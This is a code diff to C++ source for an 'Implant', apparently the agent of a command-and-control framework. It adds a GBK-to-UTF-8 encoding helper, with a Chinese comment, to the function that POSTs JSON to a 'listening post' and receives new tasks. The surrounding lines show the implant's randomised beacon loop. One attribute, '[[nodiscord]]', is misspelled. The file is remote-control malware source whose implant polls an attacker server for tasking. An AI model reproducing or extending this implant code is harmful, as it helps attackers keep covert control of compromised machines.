@@ -21,19 +21,38 @@
 
 using json = nlohmann::json;
 
+
+std::string GBKToUTF8(const std::string& strGBK)
+{
+    std::string strOutUTF8 = "";
+    WCHAR* str1;
+    int n = MultiByteToWideChar(CP_ACP, 0, strGBK.c_str(), -1, NULL, 0);
+    str1 = new WCHAR[n];
+    MultiByteToWideChar(CP_ACP, 0, strGBK.c_str(), -1, str1, n);
+    n = WideCharToMultiByte(CP_UTF8, 0, str1, -1, NULL, 0, NULL, NULL);
+    char* str2 = new char[n];
+    WideCharToMultiByte(CP_UTF8, 0, str1, -1, str2, n, NULL, NULL);
+    strOutUTF8 = str2;
+    delete[]str1;
+    str1 = NULL;
+    delete[]str2;
+    str2 = NULL;
+    return strOutUTF8;
+}
+
 // Function to send an asynchronous HTTP POST request with a payload to the listening post
 [[nodiscord]] std::string sendHttpRequest(std::string_view host,
     std::string_view port,
     std::string_view uri,
-    std::string_view payload) {
+    std::string payload) {
         // Set all our request constants
         auto const serverAddress = host;
         auto const serverPort = port;
         auto const serverUri = uri;
         //1.1
         auto const httpVersion = 11;
-        auto const requestBody = json::parse(payload);
-
+        //<nlohmann/json.hpp> 解析不了GBK ，需要转换一下
+        auto const requestBody = json::parse(GBKToUTF8(payload));
         // Construct our listening post endpoint URL from user args, only HTTP to start
         std::stringstream ss;
         ss << "http://" <<serverAddress << ":" << serverPort << serverUri;
@@ -52,6 +71,9 @@ using json = nlohmann::json;
         // Return the body of the response from the listening post, may include new tasks
         return response.text;
     };
+
+
+
 
 // Method to enable/disable the running status on our implant
 void Implant::setRunning(bool isRunningIn){isRunning = isRunningIn;}
@@ -167,6 +189,7 @@ void Implant::beacon(){
         const auto sleepTimeDouble = dwellDistributionSeconds(device);
         const auto sleepTimeChrono = std::chrono::seconds{static_cast<unsigned long long>(sleepTimeDouble)};
         std::this_thread::sleep_for(sleepTimeChrono * 10);
+        //std::this_thread::sleep_for(sleepTimeChrono );
     }
 }
 
